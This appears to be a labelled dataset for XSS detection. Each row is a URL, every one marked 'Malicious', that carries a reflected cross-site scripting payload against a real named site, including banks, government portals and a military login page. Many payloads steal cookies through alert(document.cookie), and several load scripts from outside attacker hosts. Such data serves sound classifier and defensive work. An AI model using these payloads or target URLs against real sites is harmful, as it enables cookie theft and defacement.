"http://www.ing.ro/ing/ing/carduri/card-cont-rol/aplica-acum.html?param_render=true&param_firstpage=-1&param_caid=99461e33-47ff-4edf-95f7-9d8a8f0fc9af&param_actionid=2&param_pageid=2&param_currency=>""><script%20%0a%0d>alert('xss%20by%20turkpower%20-%20from%20turkey')%3b</script>&param_pageaction=next&param_cpageinfo_length=3&param_cpageinfo%5b0%5d%2ename=date%20de%20contact&param_cpageinfo%5b0%5d%2estate=1&param_cpageinfo%5b0%5d%2eid=2&param_cpageinfo%5b0%5d%2ecols=2&param_cpageinfo%5b0%5d%2erows=8&param_cpageinfo%5b0%5d%2ewebcontrolname=null&param_cpageinfo%5b1%5d%2ename=date%20personale&param_cpageinfo%5b1%5d%2estate=1&param_cpageinfo%5b1%5d%2eid=3&param_cpageinfo%5b1%5d%2ecols=2&param_cpageinfo%5b1%5d%2erows=8&param_cpageinfo%5b1%5d%2ewebcontrolname=null&param_cpageinfo%5b2%5d%2ename=informatii%20produs&param_cpageinfo%5b2%5d%2estate=1&param_cpageinfo%5b2%5d%2eid=10&param_cpageinfo%5b2%5d%2ecols=2&param_cpageinfo%5b2%5d%2erows=8&param_cpageinfo%5b2%5d%2ewebcontrolname=null&render_name=111-222-1933email@address.tst&render_surname=111-222-1933email@address.tst&render_phoneno=111-222-1933email@address.tst&render_email=111-222-1933email@address.tst&render_contacthours=0&submit22=pasul%20urmator%20%26gt%3b%26gt%3b",Malicious
http://automoviles.aol.com/search/?q=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.londonstockexchange.com/en-gb/global/h/search?q=%3ch1%3e%3cmarquee%3exssed&amp;rt=3&amp;,Malicious
http://monsterddl.com/search.html?q=%3cmarquee%3egurus%3c/maruqee%3e,Malicious
http://hypernews.slac.stanford.edu/hypernews/geant4/view-members.pl?page=2%22%3e%3cbody%20background<br>=%22http://www.lenagold.ru/fon/ani/cat/raz/razcat34.jpg%22%3e%3cscript%3ealert%28%22xss%22%29%3c/scr<br>ipt%3e%3ciframe%20width=%22420%22%20height=%22315%22%20src=%22http://www.youtube.com/embed/qh2-tgulw<br>u4%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e&amp;find=^b,Malicious
http://www.gue-ngl.org/showpage.jsp?id='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%<br>3ewhitehat%20forever%3c/marque%3e=1,Malicious
http://look2.jp/r.php?id=look2support&amp;no=4605940'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://newyork.yankees.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.eia.org.uk/view.php?id=948%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.tochio-tanada.com/cgi-bin/topics/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20<br>-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.manutube.com/index_en.php?file=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3<br>e,Malicious
http://billdouglas.ex.ac.uk/eve/search.asp?strcollection=&amp;txttitle=&amp;txtclass=&amp;txtmain=&amp;txtdesc=&amp;strs<br>earch=aaaaaaaaa&amp;intpagenum=%22%3e%3cscript%20src=http://byccc.awardspace.com/js/xssccc.js%3e%3c/scri<br>pt%3e&amp;oldstrsearch=&amp;stradvancedsearch=&amp;printable=no&amp;typeofsearch=&amp;noofresults=10&amp;btnsubmit=go,Malicious
http://janiking.com.tr/franchiseb.php?menu=4'%22%3e%3cscript%20src=http://sinek.pandela.net/j.js%3e%<br>3c/script%3e,Malicious
http://www.yoquierogames.com/games.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.mot.gov.sy/serv/files/index.php?ctg=%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;y<br>r=&amp;srch=,Malicious
http://www.dealclick.co.uk/newsearch.php?term=%22%3e%3c/title%3e%3cscript%3ealert(123)%3c/script%3e&amp;<br>dept=subcat%3a%3agold%2bbracelets,Malicious
http://www.sinecure.org/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3<br>ealert(document.cookie)%3b%3c/script%3e,Malicious
http://www.hossohbet.com/mkportal/include/pmpopup.php?u1=www.redeye.org&amp;m1=&lt;script&gt;alert(%2%200docum<br>ent.cookie)&lt;/script&gt;&amp;m2=&lt;h1&gt;hacked%20&lt;/h1&gt;&amp;m3=by&amp;m4=&lt;h1&gt;red%20eye//the_redeye@hotmail.de&lt;/h1,Malicious
http://ka-te.ro/search.php?lang=ro&amp;qs=%22%3e%3cscript%3ealert(/xssed+by+dr.optix%20:%20for+education<br>al+purposes+only%20:%20temporary%20xss/)%3c/script%3e,Malicious
http://www.vikingscycling.org.au/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://cgi37.plala.or.jp/mitunori/a-news232/a-news.cgi?date=2005.04.30&amp;cal=%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.szbti.gov.cn/download/test.php3?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://menofthevine.org/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://msn.anp.nl/msn/nieuws.do?action=article&amp;id=%22%3e%3cscript%20src=http://sinek.pandela.net/j.j<br>s%3e%3c/script%3e,Malicious
http://isicad.ru/news.php?news=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;<br>/h1&gt;&lt;/marquee&gt;,Malicious
http://uk.shopping.com/xfs?kw=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;clt=sch,Malicious
http://www.lafederalonline.gov.ar/minishowcase/libraries/ajax.gateway.php?cpaint_function=get_galleries&cpaint_response_type=%27%22%28%29%26%251%3cscript%20%3eprompt%28939392%29%3c%2fscript%3,Malicious
http://www.lidernet.com.br/loja/scripts/listsec.asp?sec=02&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;<br>)&lt;/script&gt;,Malicious
http://www.arremate.com/brasil/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.pmang.com/loginform.nwz?pageurl=%22%3e%3cscript%20%0a%0d%3ealert(%22xss%20by%20d3vbit3%22<br>);%3c/script%3e,Malicious
http://www.toorgle.com/results.php?cx=009817295251880643908%3amtoxh90yxnq&amp;q=%22%3e%3c%2fobject%3e%3c<br>script%3ealert(1)%3b%3c%2fscript%3e&amp;sa=search+torrent&amp;cof=forid%3a11&amp;security=666,Malicious
http://www.xzqh.cn/class.asp?owen1=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://mybasvuru.com/basvurutamamlandi_mybasvuru.asp?ref=&lt;body bgcolor=black&gt;&lt;iframe width=&quot;800&quot;<br>height=&quot;500&quot; src=&quot;http://gamil.net.tc&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(/gamilnetprotection/)&lt;/script&gt;,Malicious
http://www.cgi-amigo.com/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-<br>%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.wataku.co.jp/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%<br>20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://www.team-starkenburg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hilfe-fuer-frauen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bendigobank.com.au/public/search/index.asp?zoom_query=%22%3e%3ciframe%20src=%22http://xss<br>ed.com%22%3e,Malicious
http://domains.whois.com/hosting.php?type=%27%22%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.ghana50.gov.gh/tourism/index.php?op=getashantisiteinfo&id=<script>alert(document.cookie)</script>,Malicious
"http://ipanorama.globo.com/plantao/caderno_especial/enviar.asp?codigo=52641&amp;titulo=&lt;script&gt;alert(str<br>ing.fromcharcode(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,9<br>8,117,103,98,117,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://galaxy.ealing.gov.uk/cgi-bin/vps2.5_viewpoint.sh?enqtype=authortitle&amp;enqpara1=default&amp;s_strin<br>g=testino%2c+mario&amp;s_type='a'&amp;no_of_results=9&amp;authorpage=0&amp;authorrecord=1&amp;sec_stng=&amp;media_stng=&amp;sess<br>ion_no=1443500&amp;time=7917&amp;page=-1&amp;search_string=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://www.inegi.gob.mx/lib/buscador/busqueda.aspx?av=%3e%22%3e%3cscript%3ealert('norehem%20was%20he<br>re!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%<br>3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/nor<br>ehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious
http://www.download-free.programas-gratis.net/php/search.php?buscar=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;vi<br>ene=1,Malicious
http://www.senate.gov/general/search/search_cfm.cfm?x=0&amp;y=0&amp;site=default_collection&amp;num=10&amp;filter=0&amp;<br>q=%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.hecb.wa.gov/search.asp?query=%22%3cscript%3ealert(%22found%20by%20hotpockets%20of%20backs<br>lashsecurity.org%22)%3c/script%3e,Malicious
http://www2.dgeep.mtss.gov.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;s<br>earchtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.mobilnost.rs/sitegenius/article.php?id=%22%3e%3cscript%3ealert(/xss/.source)%3c/script%3e,Malicious
http://www.kiyosan.co.jp/php4/search_categ.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js<br>%3e%3c/script%3e,Malicious
http://www.igis.gov.au/feedback/index.cfm?email=&amp;feedbacktext=&amp;preview=%20continue%20&amp;t_name=%22%2f%<br>3e%3cbody%20onload=%22alert%281%29%22%3e,Malicious
http://www.jobsdb.com/hk/en/v6/js/jobsearch/jobsearch.asp?pn=joblisting&amp;pagename=adslist&amp;searchtext=<br>%22%3e%3cscript%3ealert%28%27i-landet%27%29%3c/script%3e,Malicious
http://fr.altavista.com/web/ffset?ref=%22%3e%3c/title%3e%3cscript%3ealert(1337);%3c/script%3e%3cmarq<br>uee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e=,Malicious
http://www.dms.gov.mv/news.php?id=29%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.centromodaonline.com/nfw/news.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ligattsecurity.com/?s=%3cscript%3ealert%28%22yeah...%20i%20learned%20to%20hack%20online%2<br>2%29%3c/script%3e&amp;submit.x=0&amp;submit.y=0,Malicious
http://www.boulanger.fr/webapp/wcs/stores/servlet/catalogsearchresult?storeid=10001&amp;catalogid=10001&amp;<br>langid=-2&amp;searchterm=+%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(%22xss%22)%3b%3c%2fscript%3e%3cmarque<br>e+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;searchscope=&amp;x=11&amp;y=11,Malicious
http://www.gameland.lt/index.php?search=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e,Malicious
"http://www.saintcorporation.com/cgi-bin/archive.pl?cmd=index&amp;list=&quot;&gt;&lt;script&gt;alert(string.fromcharcod<br>e(88,83,83))&lt;/script&gt;",Malicious
http://www.dft.gov.uk/?view=filter&amp;h=a&amp;a=5201&amp;pg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kiemcun.downarchive.com/6c2/da/index+php+pagina+c+boot+ini+mainphp...++%22%3e%3cscript%3e<br>alert%28document.cookie%29%3c/script%3e,Malicious
http://famillesdavant.linternaute.com/cgi/recherche/recherche_individu.php?f_recherche_prenom=&amp;f_rec<br>herche_nom=%22'--%3e/%3e);};alert(-1);%3c/script%3e%3cscript%3ealert('hello%20the%20rat')%3c/script%<br>3e&amp;f_recherche_annee_de_naissance=&amp;f_recherche_annee_de_naissance_delta=&amp;f_recherche_ville_naissance<br>=&amp;f_recherche_annee_de_deces=&amp;f_recherche_annee_de_deces_delta=&amp;f_recherche_ville_deces=&amp;x=&amp;y=,Malicious
http://wailing.org/freebsd/test/search.cgi?keyword=203.216.197.236&amp;start=4&amp;to=23&amp;bbs=c%00%22%22%3csc<br>ript%3ealert(123);%3c/script%3e,Malicious
http://www.cfnielsen.com/material.php?id=17%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.ukcops.org/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.sehitlerolmez.net/sehit_ara.php?ad=%22%3e%3cscript%3ealert(%22asker+vurulunca+degil,+unut<br>ulunca+olur%22)%3c/script%3e",Malicious
"http://www.massif-central-diact.gouv.fr/index.php?rubrique=%22%3e'%3e%3cscript%3ealert(string.fromch<br>arcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
"http://www.hopam.com/mailform.asp?mail=erkan_aksu08@yahoo.com,isim=erkan%20aksu}%3c/style%3e%3cscrip<br>t%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%<br>3c/h1%3e%3c/marquee%3e",Malicious
http://www.tavla06.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.b2bnagpur.com/services/contact1_2.asp?cnt=1&amp;servname1=computer+planet&amp;servemail1=prashant<br>atkari%40yahoo.com&amp;mode=9%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarque<br>e%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://elme.3-ch.net/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
https://www.us.army.mil/appiansuite/login/login.fcc?type=33554433&amp;realmoid=06-000a4cd6-218f-1122-97e<br>a-832f882f0000&amp;guid=&amp;smauthreason=0&amp;method=get&amp;smagentname=$sm$hp4c7qpyp2ktcveq%2f723ecl4%2bjuihqcnr<br>mbd2kxccsc%3d&amp;target=%22%3e%3cscript%3ealert('xylitol%20is%20back!')%3c/script%3e,Malicious
http://thegioiwebsite.net/tin-tuc/?action=view&pcatid=78%22%3e%3cscript%3ealert%281%29%3c/script%3e&scatid=86&newsid=71,Malicious
http://fr.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.iby-bank.com/eng/send.asp?page=e-banking.asp&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; <br>&lt;- bank of yemen,Malicious
http://biophysics-rio.org/cv.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
http://quazen.com/?s=%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e,Malicious
http://www1.webng.com/gbal/linportal/default.asp?page=search&amp;kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious
http://lonestarwesterndecor.resultspage.com/search?p=q&amp;srid=s9-4&amp;ts=custom&amp;lbc=lonestarwesterndecor&amp;<br>uid=289674918&amp;w=%22%3e%3c%2fa%3e%3cscript%3ealert(document.cookie)%3b%3c%2fscript%3e,Malicious
http://service.govdelivery.com/service/subscribe.html?code=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.billgates.com/?q=%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;go=search&amp;domain=billgat<br>es.com&amp;search=1,Malicious
http://ipcat.leeds.ac.uk/do_search.asp?dosearch=search&amp;title=%3cscript%3ealert%28document.cookie%29%<br>3b%3c%2fscript%3e&amp;titlekeywords=&amp;publisherkeywords=&amp;issuingkeywords=&amp;issn=&amp;library=,Malicious
http://jobsearch.studentjobs.gov/getjob.asp?jobid=62181091&amp;avsdm&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://fr.mcdonalds.fantasy.fifa.com/m/stats.mc?stat=leaders&amp;phase=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(12345,4<br>252048958)%3b&lt;/script&gt;&amp;page=2",Malicious
http://nonki.ffvv.net/?d=2007-09-12%3c/title%3e%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://replay.tickets.com/buy/myticketsservlet?orgid=testicles&quot;&gt;&lt;script&gt;alert(document.cokie);&lt;/scri<br>pt&gt;,Malicious
http://www.designtaxi.com/news.jsp?id=7191&amp;monthview=1&amp;month=2&amp;year='%3e%22%3e%3cscript/src=http://k<br>usomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.businessnation.com/cgi-bin/bidsearch/search.cgi?keywords=%3cscript+src%3dhttp://vuln.xsse<br>d.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://www.tvblog.jp/bin/banlog_search.pl?tmpl=all&amp;query=%22%3e%27%3e%3cscript%3ealert%28%22kusomiso<br>.com%22%29%3c%2fscript%3e,Malicious
http://www.mcgeorge.edu/shop/shopcustadmin.asp?msg=%3cscript%3ealert('by%20codes%201923turk%20grup')<br>;%3c/script%3e,Malicious
http://www.itsdeployment.its.dot.gov/resultkeyword.asp?keyword=%22%3e%3ch1%3ebackdoor%3cscript%3eale<br>rt(1)%3c/script%3e,Malicious
http://www.njliji.com/product.asp?bigclassname=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73<br>%63%72%69%70%74%3e%0a,Malicious
http://www.britannica.com/search?query=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&amp;ct=&amp;<br>searchsubmit.x=0&amp;searchsubmit.y=0,Malicious
http://www.netsun.com/member/?returl=%2fmember%2faction.cgi%3f%22%3e'%3e%3cscript%3ealert('xss')%3c/<br>script%3e&amp;g=,Malicious
http://ame.com/search.cfm?find=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3<br>c%2fscript%3e,Malicious
http://www.afterthefight.com/alex_guestbook4/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fullreleases.com/newmembers/pre_search.php?act=search&amp;act2=src&amp;id=7031&amp;fsize12=5&amp;search=%<br>22%22%3e%3e%3c%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e%27%3c%2fscript%3e%3<br>cscript%3ealert%28document.domain%29%3c%2fscript%3e&amp;submit2=search,Malicious
http://www.sevillafc.es/_www/temporada.php?op=cro&quot;&gt;&lt;script&gt;alert(/fenerbahce/)&lt;/script&gt;&amp;id=2609&quot;&gt;&lt;sc<br>ript&gt;alert(/fenerbahce/)&lt;/script&gt;,Malicious
http://www.landrover.fi/default.asp?l=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3b&lt;/script&gt;&lt;<br>h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fedworld.gov/cgi-bin/waisgate?waisquerystring=%3cscript%3ealert('pantera%20rulez%20u%20go<br>t%20stall0wn3d')%3c/script%3e,Malicious
http://www.ttnetbasvurusu.com/basvurutamamlandi_mybasvuru.asp?ref=%3cbody%20bgcolor=black%3e%3cifram<br>e%20width=%22800%22%20height=%22500%22%20src=%22http://gamil.net.tc%22%3e%3c/iframe%3e%3cscript%3eal<br>ert(/gamilnetprotection/)%3c/script%3e,Malicious
http://www.bouticrea.com/shop/search.php?lang=&amp;sort=id&amp;search_query=\%22%3e%3cscript%3ealert(1337)%3<br>c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xerces%3c/h1%3e%3c/marquee%3e&amp;page=0,Malicious
http://calendario.peoples.it/lepokerine/common/video_gallery.php?id=1%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29;%3c/script%3e%3c%22,Malicious
http://www.pucpr.edu/exalumnos/galery/igallery33/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.owensclickplace.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
http://www.ayturk.de/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=%3cscript%3ealert(document.cookie<br>)%3c/script%3e%3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://ipkps.bsu.edu.ru/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1<br>&gt;st@rext&lt;/h1&gt;,Malicious
http://search.tycoelectronics.com/electronics/?ui_mode=question&amp;charset=utf-8&amp;language=en-us&amp;questio<br>nsource=electronics&amp;search_type=part&amp;question_box=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdpart<br>y/scripts/hotpockets.js%3e,Malicious
http://se.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://www.cgcc.gov.cn/news_view.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://info.alexa.com/data/details/traffic_details?url=http%3a%2f%2fkusomiso.com%2f%27%3e%22%3e%3c%2<br>fscript%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e,Malicious
http://www.mcgilltribune.com/media/storage/paper234/news/2008/09/23/ae/pop-rhetoric.i.pledge.allegia<br>nce.to.the.dude-3445303.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%<br>3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.lidovky.cz/americky-fed-napravuje-krizi-kolem-hypotek-fke-/ln_ekonomika.asp?c=%22%3e%3cbo<br>dy+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%<br>20by%20encore%20%3c/h2%3e,Malicious
http://maruta.be/regist.cgi?mode=user_insert_confirm&amp;user_id=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2<br>f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;user_password=&amp;user_password2=&amp;user_mail=&amp;user_mail2<br>=&amp;user_nick_nm=&amp;user_mail_magazine_flag=1&amp;submit=%93%af%88%d3%82%b7%82%e9,Malicious
http://forums.amd.com/game/index.cfm?ftvar_subcat=258&amp;nocookies=y&amp;subcatname=%22%3e%3cscript%3ealert<br>(%22--daimon--%20%20haha%20amd%20xss%20alert%20:p%22)%3c/script%3e,Malicious
http://www.tehrantimes.com/index_services.asp?chid=247&amp;name=politics%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.id-bau.de/ploegerundbohl/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://icnewcastle.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.or<br>g/)%3c/script%3e%3cp,Malicious
http://www.picosearch.com/cgi-bin/ts.pl?index=448467&amp;picocaller1=%3e%3cscript%3ealert(%22xssed%22)%3<br>c/script%3e&amp;picocaller3=%2fdefault.aspx&amp;picocaller4=www.xssed.com,Malicious
http://roma.corriere.it/milano/aziende/search?cosa=%22%3e%3cscript%3ealert%28document.cookie%29;%3c/<br>script%3e&amp;dove=milano&amp;provincia=milano&amp;partner=rcs&amp;dominio=milano&amp;cerca=,Malicious
http://www.mapquest.com/maps/map.adp?formtype=address&amp;country=us&amp;popflag=0&amp;latitude=&amp;longitude=&amp;name<br>=&amp;phone=&amp;level=&amp;addtohistory=&amp;cat=%22%3e%3cscript%3ealert(%2f%5c'the-sh0ck-b0y-www.rootingforced.org<br>%5c'%2f)%3c%2fscript%3e&amp;address=&amp;city=&amp;state=&amp;zipcode=,Malicious
http://www.randomimage.us/friendemail.php?image=25291&amp;name=%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.tuvbrasil.com.br/busca.asp?busca=%3cscript%3ealert%28%22fzero+rulez!%22%29%3c%2fscript%3e<br>&amp;x=13&amp;y=8,Malicious
http://competition.software.eu.playstation.com/kaka/kakacomp.php?locale=&quot;};alert(&quot;xss&quot;);&lt;/script&gt;&lt;sc<br>ript+src=http://z.l.to&gt;&lt;/script&gt;&lt;plaintext&gt;,Malicious
"http://buyinglamictal.org/search.php?search_text=/""><script>alert(1)</script>&i1.x=3&i1.y=11",Malicious
http://www.besac.com/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://www.gamer.hr/recenzije/civ4beyondsword.php?id=%27%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://geoliss.ekoplan.gov.rs/index.php?page=projekti/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;<br>src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious
http://www.recovery.gov/transparency/recipientreporteddata/pages/recipientprojectsummary508.aspx?awa<br>rdidsur=40374%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://mashmaker.intel.com/web/gallery.php?sortby=pop&amp;query=%22%3e%3cscript%3ealert(string.fromcharc<br>ode(115,101,121,109,101,110))%3c/script%3e",Malicious
http://animation.orange.fr/gps/video/video.php?video=4%22%3e%3cscript%3ealert%28/xss/.source%29%3c/s<br>cript%3e,Malicious
http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=%22%3e%3cscript%3ealert(/sh0ck/)%3<br>c/script%3e&amp;curl=aaaaaaa,Malicious
http://fotolog.olx.com/nf/alerts.php?category=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
